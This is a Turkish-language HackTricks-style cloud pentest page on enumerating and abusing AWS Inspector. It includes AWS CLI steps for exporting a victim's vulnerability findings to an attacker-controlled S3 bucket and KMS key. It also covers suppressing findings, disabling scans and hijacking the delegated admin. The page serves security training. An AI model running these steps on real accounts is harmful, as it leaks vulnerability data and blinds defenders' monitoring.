# AWS - Inspector Enum

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>
{% endhint %}

## Inspector

Amazon Inspector, AWS ortamınızın güvenliğini artırmayı amaçlayan gelişmiş, otomatik bir zayıflık yönetimi hizmetidir. Bu hizmet, sürekli olarak Amazon EC2 örneklerini, Amazon ECR'deki konteyner görüntülerini, Amazon ECS'yi ve AWS Lambda işlevlerini zayıflıklar ve istenmeyen ağ maruziyetleri açısından tarar. Güçlü bir zayıflık istihbarat veritabanını kullanarak Amazon Inspector, ciddiyet seviyeleri ve iyileştirme önerileri de dahil olmak üzere detaylı bulgular sağlar ve kuruluşların güvenlik risklerini proaktif bir şekilde belirlemelerine ve ele almalarına yardımcı olur. Bu kapsamlı yaklaşım, çeşitli AWS hizmetlerinde güçlü bir güvenlik duruşunu sağlayarak uyumluluk ve risk yönetimine yardımcı olur.

## Ana unsurlar

### Bulgular

Amazon Inspector'daki bulgular, EC2 örneklerinin, ECR depolarının veya Lambda işlevlerinin taranması sırasında keşfedilen zayıflıklar ve maruziyetler hakkında detaylı raporlardır. Durumuna bağlı olarak, bulgular şu şekilde kategorize edilir:

- **Aktif**: Bulgular giderilmemiştir.
- **Kapalı**: Bulgular giderilmiştir.
- **Baskılanmış**: Bulgular, bir veya daha fazla **baskılama kuralı** nedeniyle bu durumla işaretlenmiştir.

Bulgular ayrıca aşağıdaki üç türe ayrılır:

- **Paket**: Bu bulgular, kaynaklarınızda yüklü yazılım paketlerindeki zayıflıklarla ilgilidir. Örnekler arasında güncellenmemiş kütüphaneler veya bilinen güvenlik sorunları olan bağımlılıklar bulunur.
- **Kod**: Bu kategori, AWS kaynaklarınızda çalışan uygulamaların kodundaki bulguları içerir. Yaygın sorunlar, güvenlik ihlallerine yol açabilecek kodlama hataları veya güvensiz uygulamalardır.
- **Ağ**: Ağ bulguları, saldırganlar tarafından sömürülebilecek ağ yapılandırmalarındaki potansiyel maruziyetleri tanımlar. Bunlar, açık portlar, güvensiz ağ protokolleri ve yanlış yapılandırılmış güvenlik gruplarını içerir.

### Filtreler ve Baskılama Kuralları

Amazon Inspector'daki filtreler ve baskılama kuralları, bulguları yönetmenize ve önceliklendirmenize yardımcı olur. Filtreler, ciddiyet veya kaynak türü gibi belirli kriterlere göre bulguları hassaslaştırmanıza olanak tanır. Baskılama kuralları, düşük riskli kabul edilen belirli bulguları bastırmanıza, zaten hafifletilmiş olmalarına veya başka önemli bir nedenle aşırı yüklenmelerini önlemenize olanak tanır, bu da güvenlik raporlarınızı aşırı yüklemekten korur ve daha kritik konulara odaklanmanıza olanak tanır.

### Yazılım Malzeme Listesi (SBOM)

Amazon Inspector'daki Yazılım Malzeme Listesi (SBOM), kütüphaneler ve bağımlılıklar da dahil olmak üzere bir yazılım paketindeki tüm bileşenleri detaylı bir şekilde listeleyen dışa aktarılabilir iç içe envanter listesidir. SBOM'lar, yazılım tedarik zincirine şeffaflık sağlayarak daha iyi zayıflık yönetimi ve uyumluluk sağlar. Açık kaynak ve üçüncü taraf yazılım bileşenleriyle ilişkili riskleri tanımlamak ve hafifletmek için önemlidir.

## Ana özellikler

### Bulguları dışa aktar

Amazon Inspector, bulguları Amazon S3 Buckets, Amazon EventBridge ve AWS Security Hub'a dışa aktarma olanağı sunar, bu da belirlenen zayıflıkların ve maruziyetlerin ayrıntılı raporlarını daha sonra analiz veya paylaşım için oluşturmanıza olanak tanır. Bu özellik, CSV ve JSON gibi çeşitli çıktı biçimlerini destekler, böylece diğer araçlar ve sistemlerle entegrasyonu kolaylaştırır. Dışa aktarma işlevselliği, raporlara dahil edilecek verilerin özelleştirilmesine olanak tanır, belirli kriterlere göre bulguları filtrelemenizi sağlar (örneğin ciddiyet, kaynak türü veya tarih aralığı) ve varsayılan olarak mevcut AWS Bölgesindeki tüm bulguları Aktif durumda içerir.

Bulguları dışa aktarırken, verileri şifrelemek için bir Anahtar Yönetimi Servisi (KMS) anahtarı gereklidir. KMS anahtarları, dışa aktarılan bulguların yetkisiz erişime karşı korunduğundan emin olur, hassas zayıflık bilgileri için ek bir güvenlik katmanı sağlar.

### Amazon EC2 örneklerini tarama

Amazon Inspector, Amazon EC2 örneklerindeki zayıflıkları ve güvenlik sorunlarını tespit etmek için güçlü tarama yetenekleri sunar. Inspector, EC2 örneğinden çıkarılan meta verileri, güvenlik uyarılarından kurallarla karşılaştırarak paket zayıflıklarını ve ağ erişilebilirlik sorunlarını üretir. Bu taramalar, hesabınızın **tarama modu** ayarları yapılandırmasına bağlı olarak **ajans tabanlı** veya **ajanssız** yöntemlerle gerçekleştirilebilir.

- **Ajans Tabanlı**: Derinlemesine taramaları gerçekleştirmek için AWS Sistem Yöneticisi (SSM) ajanını kullanır. Bu yöntem, özelliğin doğrudan örneğinden kapsamlı veri toplama ve analizine izin verir.
- **Ajanssız**: Örneğe ajan kurulumu gerektirmeyen hafif bir alternatif sunar, EC2 örneğinin her bir hacminin bir EBS anlık görüntüsünü oluşturur, zayıflıkları arar ve ardından siler; tarama için mevcut AWS altyapısını kullanır.

Tarama modu, EC2 taramalarını gerçekleştirmek için hangi yöntemin kullanılacağını belirler:

- **Ajans Tabanlı**: Derinlemesine inceleme için EC2 örneklerine SSM ajanı kurulumunu içerir.
- **Hybrid Tarama**: Kapsamı maksimize etmek ve performans etkisini en aza indirmek için hem ajans tabanlı hem de ajanssız yöntemleri birleştirir. SSM ajanının kurulu olduğu EC2 örneklerinde Inspector, ajans tabanlı bir tarama gerçekleştirir ve SSM ajanın olmadığı örneklerde gerçekleştirilen tarama ajanssız olur.

Başka bir önemli özellik, EC2 Linux örnekleri için **derin inceleme**dir. Bu özellik, EC2 Linux örneklerinin yazılım ve yapılandırmasının detaylı bir şekilde analizini sunar, işletim sistemi zayıflıkları, uygulama zayıflıkları ve yapılandırma hataları da dahil olmak üzere detaylı zayıflık değerlendirmeleri sağlar, kapsamlı bir güvenlik değerlendirmesi sağlar. Bu, varsayılan olarak Amazon Inspector'ın aşağıdakileri tarayacağı ancak her üye hesabının 5 daha fazla özel yol tanımlayabileceği ve her yetkilendirilmiş yöneticinin 10'a kadar tanımlayabileceği **özel yolların** incelemesi yoluyla başarılır:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR konteyner görüntülerini tarama

Amazon Inspector, Amazon Elastic Container Registry (ECR) konteyner görüntülerinde paket zayıflıklarının etkin bir şekilde tespit edilmesini sağlayan güçlü tarama yetenekleri sunar.

- **Temel Tarama**: Bu, konteyner görüntülerindeki bilinen işletim sistemi paketlerindeki zayıflıkları tanımlayan hızlı ve hafif bir taramadır ve açık kaynak Clair projesinden standart bir kural kümesini kullanır. Bu tarama yapılandırmasıyla, depolarınız itildiğinde taranır veya manuel taramalar gerçekleştirilir.
- **Gelişmiş Tarama**: Bu seçenek, itme taramasına ek olarak sürekli tarama özelliğini ekler. Gelişmiş tarama, her konteyner görüntüsünün katmanlarının derinlemesine incelenmesini sağlar ve işletim sistemi paketlerinde ve programlama dilleri paketlerindeki zayıflıkları daha yüksek doğrulukla tanımlar. Hem temel görüntüyü hem de herhangi ek katmanları analiz eder, potansiyel güvenlik sorunlarının kapsamlı bir görünümünü sağlar.

### Amazon Lambda işlevlerini tarama

Amazon Inspector, AWS Lambda işlevleri ve katmanları için kapsamlı tarama yetenekleri sunar, sunucu olmayan uygulamaların güvenliğini ve bütünlüğünü sağlar. Inspector, Lambda işlevleri için iki tarama türü sunar:

- **Lambda standart tarama**: Bu varsayılan özellik, Lambda işlevinize ve katmanlarına eklenen uygulama paketi bağımlılıklarındaki yazılım zayıflıklarını tanımlar. Örneğin, işleviniz python-jwt gibi bir kütüphanenin bilinen bir zayıflık sürümünü kullanıyorsa, bir bulgu oluşturur.
- **Lambda kod taraması**: Özel uygulama kodunu güvenlik sorunları açısından analiz eder, enjeksiyon hataları, veri sızıntıları, zayıf şifreleme ve eksik şifreleme gibi zayıflıkları tespit eder. Algılanan zayıflıkları vurgulayan kod parçalarını yakalar, örneğin sabitlenmiş kimlik bilgileri gibi. Bulgular, sorunları düzeltmek için detaylı iyileştirme önerileri ve kod parçalarını içerir.
### **İnternet Güvenlik Merkezi (CIS) taramaları**

Amazon Inspector, Amazon EC2 örnek işletim sistemlerini İnternet Güvenlik Merkezi (CIS) tarafından önerilen en iyi uygulama önerilerine karşı test etmek için CIS taramalarını içerir. Bu taramalar, yapılandırmaların endüstri standardı güvenlik temellerine uygun olup olmadığını sağlar.

- **Yapılandırma**: CIS taramaları, sistem yapılandırmalarının belirli CIS Benchmark önerilerine uygun olup uygun olmadığını değerlendirir; her kontrol, bir CIS kontrol kimliği ve başlığına bağlıdır.
- **Yürütme**: Taramalar, örnek etiketlerine ve belirlenen zamanlamalara dayalı olarak gerçekleştirilir veya planlanır.
- **Sonuçlar**: Tarama sonuçları, her örneğin güvenlik durumuna dair içgörü sağlayarak hangi kontrollerin geçtiğini, atlandığını veya başarısız olduğunu gösterir.

## Numaralandırma
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Saldırı Sonrası

{% hint style="success" %}
Bir saldırganın bakış açısından, bu hizmet saldırgana diğer örnekleri/container'ları ele geçirmesine yardımcı olabilecek zayıflıkları ve ağ maruziyetlerini bulmasına yardımcı olabilir.

Ancak, bir saldırgan bu hizmeti de bozmaya ilgi duyabilir, böylece kurban zayıflıkları (tümü veya belirli olanlar) göremez.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Bir saldırgan zayıflıkların detaylı raporlarını veya yazılım faturalandırma malzemelerini (SBOM'lar) oluşturabilir ve bunları AWS ortamınızdan dışa aktarabilir. Bu bilgiler, belirli zayıflıkları, güncellenmemiş yazılımları veya güvensiz bağımlılıkları tanımlamak için sömürülebilir ve hedeflenmiş saldırılara olanak tanıyabilir.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
Aşağıdaki örnek, Amazon Inspector'dan tüm Aktif bulguları bir saldırgan tarafından kontrol edilen bir Amazon S3 Kova'ya ve bir saldırgan tarafından kontrol edilen bir Amazon KMS anahtarıyla exfiltrate etmenin nasıl yapılacağını göstermektedir:

1. **Bir Amazon S3 Kova oluşturun** ve ona bir politika ekleyin ki kurban Amazon Inspector'dan erişilebilir olsun:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Bir Amazon KMS anahtarı oluşturun** ve ona bir politika ekleyin ki kurbanın Amazon Inspector tarafından kullanılabilir hale gelsin:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **Raporlama bulguları oluşturmak** için komutu çalıştırın ve dışa aktarın:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potansiyel Etki**: Detaylı zayıflık ve yazılım raporlarının oluşturulması ve dışa aktarılması, belirli zayıflıklar ve güvenlik açıklarına dair içgörüler elde edilmesi.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Bir saldırgan belirtilen zayıflık raporunun veya SBOM raporunun oluşturulmasını iptal edebilir, güvenlik ekiplerinin zayıflıklar ve yazılım malzeme listeleri (SBOM'lar) hakkında zamanında bilgi almasını engelleyebilir, güvenlik sorunlarının tespitini ve giderilmesini geciktirebilir.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potansiyel Etki**: Güvenlik izleme işlevinin bozulması ve güvenlik sorunlarının zamanında tespit edilmesinin ve giderilmesinin engellenmesi.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Bu izinlere sahip bir saldırgan, hangi zayıflıkların ve güvenlik sorunlarının bildirileceğini veya bastırılacağını belirleyen filtreleme kurallarını manipüle edebilir (eylem **SUPPRESS** olarak ayarlanmışsa, bir bastırma kuralı oluşturulur). Bu, kritik zayıflıkları güvenlik yöneticilerinden gizleyebilir ve bu zayıflıkları tespit edilmeden daha kolay sömürmeyi sağlayabilir. Bir saldırgan, önemli filtreleri değiştirerek veya kaldırarak, sistemi gereksiz bulgularla doldurarak etkili güvenlik izleme ve yanıtı engelleyebilir.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potansiyel Etki**: Kritik zafiyetlerin gizlenmesi veya bastırılması, veya sistemin gereksiz bulgularla doldurulması.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Bir saldırgan güvenlik yönetim yapısını önemli ölçüde bozabilir.

- Delege edilmiş yönetici hesabının devre dışı bırakılmasıyla, saldırgan güvenlik ekibinin Amazon Inspector ayarlarına ve raporlarına erişmesini engelleyebilir.
- Yetkisiz bir yönetici hesabının etkinleştirilmesi, saldırganın güvenlik yapılandırmalarını kontrol etmesine olanak tanır, taramaları devre dışı bırakabilir veya kötü niyetli faaliyetleri gizlemek için ayarları değiştirebilir.

{% hint style="warning" %}

Yetkisiz hesabın, delege edilen yönetici olabilmesi için kurbanla aynı Organizasyonda olması gerekmektedir.

Yetkisiz hesabın delege edilen yönetici olabilmesi için, meşru delege edilen yönetici devre dışı bırakıldıktan sonra ve yetkisiz hesabın delege edilen yönetici olarak etkinleştirilmeden önce, meşru yöneticinin organizasyondan delege edilen yönetici olarak kaydının silinmesi gerekmektedir. Bu, aşağıdaki komutla yapılabilir (**`organizations:DeregisterDelegatedAdministrator`** izni gereklidir): **`aws organizations deregister-delegated-administrator --account-id <meşru-hesap-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potansiyel Etki**: Güvenlik yönetiminin bozulması.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Bir saldırgan, bir Amazon Inspector organizasyonu içindeki üye hesaplarının ilişkilendirilmesini manipüle edebilir. Yetkisiz hesapları ilişkilendirerek veya meşru olanları ilişkilendirmeyerek, bir saldırgan güvenlik taramalarına ve raporlamaya hangi hesapların dahil edileceğini kontrol edebilir. Bu, kritik hesapların güvenlik izlemesinden dışlanmasına yol açabilir ve saldırganın bu hesaplardaki zafiyetleri tespit edilmeden sömürmesine olanak tanıyabilir.

{% hint style="warning" %}

Bu eylemin, yetkilendirilmiş yönetici tarafından gerçekleştirilmesi gerekmektedir.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potansiyel Etki**: Anahtar hesapların güvenlik taramalarından dışlanması, zayıflıkların algılanmadan sömürülmesine olanak tanır.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` iznine sahip bir saldırgan, belirli kaynak türlerinde (EC2, ECR, Lambda, Lambda kodu) güvenlik taramalarını devre dışı bırakabilir ve belirtilen hesaplarda AWS ortamının bazı bölümlerini denetimsiz bırakarak saldırılara karşı savunmasız hale getirebilir. Ayrıca, **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** izinlerine sahip olan bir saldırgan, şüpheli yapılandırmaların algılanmasını önlemek için taramaları seçici olarak yeniden etkinleştirebilir.

{% hint style="warning" %}
Bu eylemin, yetkilendirilmiş yönetici tarafından gerçekleştirilmesi gerekmektedir.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potansiyel Etki**: Güvenlik izlemede kör noktaların oluşturulması.

### `inspector2:UpdateOrganizationConfiguration`

Bu izne sahip bir saldırgan, Amazon Inspector kuruluşunuzun yapılandırmalarını güncelleyebilir ve yeni üye hesapları için etkinleştirilen varsayılan tarama özelliklerini etkileyebilir.

{% hint style="warning" %}

Bu eylemin, yetkilendirilmiş yönetici tarafından gerçekleştirilmesi gerekmektedir.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potansiyel Etki**: Kuruluşun güvenlik tarama politikalarını ve yapılandırmalarını değiştirmek.

### `inspector2:TagResource`, `inspector2:UntagResource`

Bir saldırgan, AWS Inspector kaynakları üzerindeki etiketleri manipüle edebilir. Bu etiketler, güvenlik değerlendirmelerini düzenlemek, takip etmek ve otomatikleştirmek için kritiktir. Etiketleri değiştirerek veya kaldırarak, bir saldırgan güvenlik taramalarından zafiyetleri gizleyebilir, uyumluluk raporlamasını bozabilir ve otomatik iyileştirme süreçlerine müdahale edebilir, bu da denetlenmemiş güvenlik sorunlarına ve tehlikeye atılmış sistem bütünlüğüne yol açabilir.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potansiyel Etki**: Zayıflıkların gizlenmesi, uyumluluk raporlarının bozulması, güvenlik otomasyonunun bozulması ve maliyet tahsisinin bozulması.

# Referanslar
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak PR'ler göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
